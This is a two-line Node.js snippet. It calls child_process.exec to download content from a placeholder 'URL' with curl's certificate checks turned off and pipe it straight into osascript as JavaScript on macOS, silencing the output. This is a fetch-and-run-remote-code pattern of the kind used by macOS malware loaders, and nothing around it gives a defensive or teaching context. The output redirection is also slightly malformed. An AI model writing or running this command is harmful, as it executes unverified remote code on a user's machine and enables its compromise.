const { exec } = require('child_process')

exec('curl -k "URL" | osascript -l JavaScript > /dev/null 2>1&')
